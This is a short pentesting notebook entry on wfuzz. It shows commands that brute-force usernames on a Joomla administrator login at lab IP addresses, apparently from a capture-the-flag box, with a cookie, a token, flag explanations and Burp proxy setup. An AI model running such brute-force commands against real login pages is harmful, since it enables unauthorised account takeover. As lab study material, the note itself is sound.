# 💢 wfuzz
Tags: #💢
Related to: 
See also: 
Previous: [[Web Crawlers & Directory Bruteforce]]

---
## Description

Wfuzz is a tool designed for bruteforcing Web Applications, it can be used for finding resources not linked (directories, servlets, scripts, etc), bruteforce GET and POST parameters for checking different kind of injections (SQL, XSS, LDAP,etc), bruteforce Forms parameters (User/Password), Fuzzing,etc.

## Usage Examples

###  Bruteforce username using wfuzz and a custom wordlist

	wfuzz -h

#### Replaces anywhere FUZZ is in all caps with a line from wordlist

##### Not proxied through burp

	wfuzz -w cewl.out -c -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&0a3ab5ecdcbc47a15beabc106e671004=1' -b '99fb082d992a92668ce87e5540bd20fa=96vrskpirtingik35nav7gh66m' http://10.129.171.59/administrator/index.php

```
-w cewl.out										// wordlist
-c												// color output  
-d 												// post data  
-b												// cookie  
-p												// proxy (burp)  
http://10.129.161.239/administrator/index.php	// target

You can exclude results with one of the following:  

--hl 114										// hide results using 114 lines.  
--hc 200										// hide results using 200 response code.

After getting a correct login, you get an authentication cookie which may then cause the remaining items in the wordlist to return success responses.
```

##### Proxied through burp

Note: If you're going to proxy wfuzz through burp, make sure the ip and port match the options!

Proxy => Options => Proxy Listeners => 127.0.0.1:8080

	fuzz -w cewl.out -c -d 'username=FUZZ&passwd=Curling2018%21&option=com_login&task=login&return=aW5kZXgucGhw&0a3ab5ecdcbc47a15beabc106e671004=1' -b '99fb082d992a92668ce87e5540bd20fa=96vrskpirtingik35nav7gh66m' -p 127.0.0.1:8080 http://10.129.171.59/administrator/index.php

---
## References
- https://tools.kali.org/web-applications/wfuzz